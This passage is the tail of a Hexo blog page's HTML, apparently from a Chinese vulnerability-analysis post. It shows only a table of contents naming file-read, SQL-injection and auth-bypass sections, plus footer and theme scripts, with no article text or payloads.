class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#services-WorkPlanService-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">&#x2F;services&#x2F;WorkPlanService SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webservice%E6%8E%A5%E5%8F%A3%E5%88%86%E6%9E%90"><span class="nav-number">8.2.</span> <span class="nav-text">webservice接口分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-3"><span class="nav-number">8.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dwr-call-plaincall-%E5%89%8D%E5%8F%B0%E7%BB%95%E8%BF%87"><span class="nav-number">9.</span> <span class="nav-text">&#x2F;dwr&#x2F;call&#x2F;plaincall&#x2F; 前台绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-number">9.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dwr-%E8%B7%AF%E7%94%B1%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="nav-number">9.2.</span> <span class="nav-text">&#x2F;dwr&#x2F;*路由逻辑分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-4"><span class="nav-number">9.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#browser-jsp-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">browser.jsp SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-number">10.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-number">10.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="nav-number">10.3.</span> <span class="nav-text">绕过分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-5"><span class="nav-number">10.4.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#do"><span class="nav-number">11.</span> <span class="nav-text">*.do</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SecurityMain"><span class="nav-number">12.</span> <span class="nav-text">SecurityMain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1day%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF"><span class="nav-number">13.</span> <span class="nav-text">1day分析思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">14.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">15.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">16.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">190k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E5%B7%A5%E4%BD%9C"><span class="nav-number">3.</span> <span class="nav-text">分析前置工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E7%BB%98%E6%8C%87%E7%BA%B9"><span class="nav-number">4.</span> <span class="nav-text">测绘指纹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FileDownloadLocation%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">5.</span> <span class="nav-text">FileDownloadLocation文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E5%8F%98%E5%BD%A2%E5%88%86%E6%9E%90"><span class="nav-number">5.2.</span> <span class="nav-text">SQL变形分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="nav-number">5.3.</span> <span class="nav-text">登录绕过分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E7%94%9F%E6%95%88%E7%82%B9%E4%B8%80"><span class="nav-number">5.4.</span> <span class="nav-text">安全策略生效点一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">5.5.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XmlRpcServlet%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">6.</span> <span class="nav-text">XmlRpcServlet文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-number">6.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#api-doc-out-more-list-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">&#x2F;api&#x2F;doc&#x2F;out&#x2F;more&#x2F;list SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SessionFilter"><span class="nav-number">7.3.</span> <span class="nav-text">SessionFilter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="nav-number">7.4.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#services-WorkPlanService-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">&#x2F;services&#x2F;WorkPlanService SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webservice%E6%8E%A5%E5%8F%A3%E5%88%86%E6%9E%90"><span class="nav-number">8.2.</span> <span class="nav-text">webservice接口分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-3"><span class="nav-number">8.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dwr-call-plaincall-%E5%89%8D%E5%8F%B0%E7%BB%95%E8%BF%87"><span class="nav-number">9.</span> <span class="nav-text">&#x2F;dwr&#x2F;call&#x2F;plaincall&#x2F; 前台绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-number">9.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dwr-%E8%B7%AF%E7%94%B1%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="nav-number">9.2.</span> <span class="nav-text">&#x2F;dwr&#x2F;*路由逻辑分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-4"><span class="nav-number">9.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#browser-jsp-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">browser.jsp SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-number">10.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-number">10.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="nav-number">10.3.</span> <span class="nav-text">绕过分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-5"><span class="nav-number">10.4.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#do"><span class="nav-number">11.</span> <span class="nav-text">*.do</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SecurityMain"><span class="nav-number">12.</span> <span class="nav-text">SecurityMain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1day%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF"><span class="nav-number">13.</span> <span class="nav-text">1day分析思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">14.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">15.</span> <span class="nav-text">附录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">16.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
